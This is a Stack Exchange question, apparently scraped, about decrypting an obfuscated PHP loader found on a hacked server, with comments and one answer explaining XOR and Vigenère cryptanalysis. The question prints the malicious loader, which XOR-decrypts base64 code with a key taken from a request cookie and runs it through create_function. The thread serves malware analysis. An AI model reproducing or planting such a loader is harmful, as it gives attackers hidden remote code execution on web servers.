{
    "title": "Help me understand how to actually break an XOR/Vigenère cipher",
    "link": "https://reverseengineering.stackexchange.com/questions/16163/help-me-understand-how-to-actually-break-an-xor-vigen%c3%a8re-cipher",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  My friend's server was recently hacked and I'm trying to decipher the malicious files I found in hopes of understanding the hack better. I can tell that they're using an XOR/Vigenère cipher and I've tried to learn everything I could about that on my own, but while I am a programmer I'm not a cryptographer and most of what I've found has gone over my head. I'm wondering if someone here would be kind enough to walk me through what I would actually need to do to break the cipher.\n </p>\n <p>\n  Here's the code in question:\n </p>\n <pre><code><?php\n\n$vewusl = 'ZW5jMTMz...XBzazt9KCRzJXMn'; //Truncated from 1165 lines of encrypted data by me, the guy asking this question\n\n$_igophqd = create_function ('$vewusl', igophqd (base64_decode (\n    'VRNSChUZGhAfX1FYQwpBU0IbBwBKBAJQbVQEUAtQUEEQTRQwXXtWcmJwZ29lVmhjIGo'.\n    'DJ0EndzJ3QzV7D3FRIlg3aSNZfGZhZmB4f2YFfGUwUDQnaDBnMWdmJGVUAFcyRxZrNF'.\n    '54anFfWlVxcQZ3ZggGISNvIGI3YGE2YjVhbyZmEVY3BXtqZ094fWICK3xvUmUvMlE3c'.\n    'yd0VARiNkB0MwAGcCFgbFFiUHNncEsjVHEFegckCSBlImdDKGExYmUwYQl2N2BoZlJ1'.\n    'UnNgYgp1ZTBHJjNSFWYscFMiexNDYTNbKGs+TXR3cQdGdH9yU1NlIFc2InswUDFzVDR'.\n    'xVXV3JWEkeyRnAVR2T2x1dGJXUnQOSzwgfCRSNnN9LWI2V20ncQ1xIXB/c2JfDmx2RC'.\n    'tzfxpqNiQIIHwgXmEjZTJ9djBlKH4xBE53dQdOfm9xFmZ0DmUiKWtQbiNgUzlwHFB0I'.\n    'gAVYCJjb3RjZQZuf2ZSY2RSdTMiCThiN2BhLHZVR2MicQ5iIwQBZXNAA3VmAlZpYQVc'.\n    'LSZsCmUhWkMtYjZXeylIUHojdw1mYVxvbHNLI1ZyCWY9JmwodiZkUwBhMWVvNEcrVyR'.\n    '0c2BxcQ5jcmISZn8gfQcna1B2IXB5NnsPZlQmdjNqJHd3fGJiD39/ZjNqciRyLDN/N3'.\n    'whA3UCUSZudDJcCmIuTXNWd094cWACK1JwDgYnM3wkZSBKeS9iMn1iM1w0agRNe1Z0B'.\n    '2R7YUsjVnIOAwAifCt6IgJ5NWExcVEkWzx7I1IIcGVfbHFhcQVhYzBDASdrUHUhc182'.\n    'dSZhfDBYN1Y3Ugx0ZWZ8dHFyKFRmBWE2IwgWYjdgYS52E1ByJmI/cS5dY3x2T1VkZl8'.\n    'wc1YndjQ7fCR+NnBqJmIzXHQ5YlB4BGMNZndPYGVmZVt2ZgpqAydBJ3cyd0MoYTVQYi'.\n    'QBIHUzY1Fwdwd0fmVEK2F1J3EiJG8OViFwfiR1DF96MFg3ZjFndHN2BlF4cXYaYWIwe'.\n    'TI0XiNFJmRlJmslfmQmYgpmNGcBVHR1e1BydlNzcFJ2PTl7O3YiAwQ7ZAx5CEYZSRNC'.\n    'anp9f3x/cxdoEURFPUEAEVUAVwEaF08USBQSPhdJE0JqandiYXNkbBQqZGMybC0uajU'.\n    'TORttSBpN'\n), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_igophqd($vewusl); \n\nfunction igophqd ($udopz, $bgsqhbl) { return $udopz ^ str_repeat ($bgsqhbl, ceil (strlen ($udopz) / strlen ($bgsqhbl))); }  \n</code></pre>\n <p>\n  I obviously don't have access to the data stored in the cookie. All the malicious files are the same, so I don't think we can use two of them to figure out the key.\n </p>\n <p>\n  Since the encrypted code creates a function, I assume it's executable PHP which likely has spaces, dollar signs, and other coding symbols. I tried using every tool I could find to help with this (\n  <a href=\"https://github.com/hellman/xortool\" rel=\"nofollow noreferrer\">\n   xortool\n  </a>\n  ,\n  <a href=\"https://github.com/davehull/MCC/blob/master/sets/1/Crack-XORRepeatingKeyCrypto.ps1\" rel=\"nofollow noreferrer\">\n   XORRepeatingKeyCrypto\n  </a>\n  ,\n  <a href=\"https://blog.didierstevens.com/programs/xorsearch/\" rel=\"nofollow noreferrer\">\n   XORSearch & XORStrings\n  </a>\n  ,\n  <a href=\"http://eternal-todo.com/var/scripts/xorbruteforcer\" rel=\"nofollow noreferrer\">\n   xorbruteforcer\n  </a>\n  ,\n  <a href=\"https://hooked-on-mnemonics.blogspot.com/p/iheartxor.html\" rel=\"nofollow noreferrer\">\n   iheartxor\n  </a>\n  ,\n  <a href=\"https://github.com/hiddenillusion/NoMoreXOR\" rel=\"nofollow noreferrer\">\n   NoMoreXOR\n  </a>\n  ) but mind you I'm not really trained to use any of those.\n </p>\n <p>\n  Based on my analysis I suspect the key contains x62 and is either 32, 36, or 28 characters long, but again, I'm not an expert at this stuff. The key may also contain: x16,x17,x0d,x0f,x33,x66,x36,6,T,12...\n </p>\n <p>\n  I understand the programming part just fine, but I thought it might be useful to have the context. Here's the just the cipher I'm trying to break, which I think is XOR encrypted with a repeating key:\n </p>\n <pre><code>VRNSChUZGhAfX1FYQwpBU0IbBwBKBAJQbVQEUAtQUEEQTRQwXXtWcmJwZ29lVmhjIGoDJ0EndzJ3QzV7D3FRIlg3aSNZfGZhZmB4f2YFfGUwUDQnaDBnMWdmJGVUAFcyRxZrNF54anFfWlVxcQZ3ZggGISNvIGI3YGE2YjVhbyZmEVY3BXtqZ094fWICK3xvUmUvMlE3cyd0VARiNkB0MwAGcCFgbFFiUHNncEsjVHEFegckCSBlImdDKGExYmUwYQl2N2BoZlJ1UnNgYgp1ZTBHJjNSFWYscFMiexNDYTNbKGs+TXR3cQdGdH9yU1NlIFc2InswUDFzVDRxVXV3JWEkeyRnAVR2T2x1dGJXUnQOSzwgfCRSNnN9LWI2V20ncQ1xIXB/c2JfDmx2RCtzfxpqNiQIIHwgXmEjZTJ9djBlKH4xBE53dQdOfm9xFmZ0DmUiKWtQbiNgUzlwHFB0IgAVYCJjb3RjZQZuf2ZSY2RSdTMiCThiN2BhLHZVR2MicQ5iIwQBZXNAA3VmAlZpYQVcLSZsCmUhWkMtYjZXeylIUHojdw1mYVxvbHNLI1ZyCWY9JmwodiZkUwBhMWVvNEcrVyR0c2BxcQ5jcmISZn8gfQcna1B2IXB5NnsPZlQmdjNqJHd3fGJiD39/ZjNqciRyLDN/N3whA3UCUSZudDJcCmIuTXNWd094cWACK1JwDgYnM3wkZSBKeS9iMn1iM1w0agRNe1Z0B2R7YUsjVnIOAwAifCt6IgJ5NWExcVEkWzx7I1IIcGVfbHFhcQVhYzBDASdrUHUhc182dSZhfDBYN1Y3Ugx0ZWZ8dHFyKFRmBWE2IwgWYjdgYS52E1ByJmI/cS5dY3x2T1VkZl8wc1YndjQ7fCR+NnBqJmIzXHQ5YlB4BGMNZndPYGVmZVt2ZgpqAydBJ3cyd0MoYTVQYiQBIHUzY1Fwdwd0fmVEK2F1J3EiJG8OViFwfiR1DF96MFg3ZjFndHN2BlF4cXYaYWIweTI0XiNFJmRlJmslfmQmYgpmNGcBVHR1e1BydlNzcFJ2PTl7O3YiAwQ7ZAx5CEYZSRNCanp9f3x/cxdoEURFPUEAEVUAVwEaF08USBQSPhdJE0JqandiYXNkbBQqZGMybC0uajUTORttSBpN\n</code></pre>\n <p>\n  And the base64 decoded version:\n </p>\n <pre><code>5513520a15191a101f5f5158430a4153421b07004a0402506d5404500b505041104d14305d7b56726270676f65566863206a0327412777327743357b0f71512258376923597c66616660787f66057c653050342768306731676624655400573247166b345e786a715f5a557171067766080621236f2062376061366235616f2666115637057b6a674f787d62022b7c6f52652f3251377327745404623640743300067021606c5162507367704b235471057a0724092065226743286131626530610976376068665275527360620a7565304726335215662c7053227b134361335b286b3e4d7477710746747f72535365205736227b305031735434715575772561247b24670154764f6c7574625752740e4b3c207c245236737d2d6236576d27710d7121707f73625f0e6c76442b737f1a6a362408207c205e612365327d763065287e31044e7775074e7e6f711666740e6522296b506e23605339701c50742200156022636f746365066e7f66526364527533220938623760612c7655476322710e6223040165734003756602566961055c2d266c0a65215a432d6236577b2948507a23770d66615c6f6c734b23567209663d266c2876266453006131656f34472b572474736071710e63726212667f207d07276b5076217079367b0f66542676336a2477777c62620f7f7f66336a7224722c337f377c2103750251266e74325c0a622e4d7356774f787160022b52700e0627337c2465204a792f62327d62335c346a044d7b567407647b614b2356720e0300227c2b7a2202793561317151245b3c7b23520870655f6c716171056163304301276b507521735f367526617c3058375637520c7465667c747172285466056136230816623760612e7613507226623f712e5d637c764f5564665f3073562776343b7c247e36706a2662335c743962507804630d66774f606566655b76660a6a0327412777327743286135506224012075336351707707747e65442b6175277122246f0e5621707e24750c5f7a30583766316774737606517871761a6162307932345e2345266465266b257e6426620a663467015474757b50727653737052763d397b3b762203043b640c790846194913426a7a7d7f7c7f7317681144453d410011550057011a174f144814123e174913426a6a77626173646c142a6463326c2d2e6a3513391b6d481a4d\n</code></pre>\n <p>\n  Or am I supposed to retain the spaces in the base64 decoded output? I'm guessing that I don't retain the spaces and that this is what I should be trying to break, but these are the kinds of things I'm not sure about.\n </p>\n <p>\n  I also created\n  <a href=\"https://gist.github.com/beaulm/d5ff6e26e9ce48e0c8f68b5623507418\" rel=\"nofollow noreferrer\">\n   a gist with the full file contents\n  </a>\n  in case we need what's in $vewusl in order to crack this cipher.\n </p>\n</div>\n</body></html>",
    "votes": "2",
    "answers": 1,
    "views": "2k",
    "tags": [
        "encryption",
        "cryptography",
        "xor"
    ],
    "user": "Beau",
    "time": "Aug 22, 2017 at 15:12",
    "comments": [
        {
            "user": "Mick",
            "text": "<html><body><span class=\"comment-copy\">\n What's the value of\n <code>\n  $_SERVER['HTTP_HOST']\n </code>\n ?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Ilmari Karonen",
            "text": "<html><body><span class=\"comment-copy\">\n I'll post a more detailed answer later, but\n <a href=\"https://stackoverflow.com/q/45821409\">\n  as I noted on SO\n </a>\n , the key length is definitely 128 bytes. I haven't managed to fully crack the cipher, but I did play around with it a bit, and it looks like the plaintext probably begins with\n <code>\n  eval (( (igophqd (base64_decode  ('\n </code>\n followed by 763 bytes of base64 data,\n <code>\n  ='),\n </code>\n and about 60 bytes that I haven't managed to decode yet. Alas, that means that there's yet another base64-and-XOR layer, probably somehow keyed by the\n <code>\n  $vewusl\n </code>\n string, involved.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Beau",
            "text": "<html><body><span class=\"comment-copy\">\n @IlmariKaronen Absolutely amazing! I'm most curious to know how you figured all that out.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  When it comes to break some encrypted texts, you have to take a few hypothesis and check it with caution (it may make you loose a lot of time... believe me).\n </p>\n <p>\n  The first Base64 decoding seems to be quite promising and lead to some hexadecimal blob that you should analyze first before trying to step further.\n </p>\n <p>\n  I would advise you to make a frequency analysis of the hexadecimal blob grouping the characters two by two (sounds pretty common as two characters in hexadecimal is a byte).\n </p>\n <p>\n  I wouldn't be surprised if:\n </p>\n <ul>\n  <li>\n   All the hexadecimal code in the blob are within the printable zone in the ASCII table.\n  </li>\n  <li>\n   Once translated back into ASCII table, the message will have no meaning.\n  </li>\n </ul>\n <p>\n  It should means that another encoding/encryption has been applied to the blob which can be either XOR-encryption or Vigenere encryption.\n </p>\n <p>\n  The good news is that both encryption (Vigenere and XOR) are quite easily breakable with the same approach.\n </p>\n <ol>\n  <li>\n   <p>\n    Perform a\n    <a href=\"https://en.wikipedia.org/wiki/Kasiski_examination\" rel=\"nofollow noreferrer\">\n     Kasiski examination\n    </a>\n    of the encrypted text to find the size of the key (the length of the encoding word if it is a Vigenere and the length of the XORing vector if it is XOR-encryption).\n   </p>\n  </li>\n  <li>\n   <p>\n    Perform a frequency analysis for each letter/byte of the Vigenere/XOR password.\n   </p>\n  </li>\n  <li>\n   <p>\n    Add some intuition and guessing to reach the full text.\n   </p>\n  </li>\n </ol>\n <p>\n  I hope this will help you a bit.\n </p>\n</div>\n</body></html>",
            "votes": "2",
            "user": "perror",
            "time": "Aug 22, 2017 at 16:50",
            "is_accepted": false,
            "comments": []
        }
    ]
}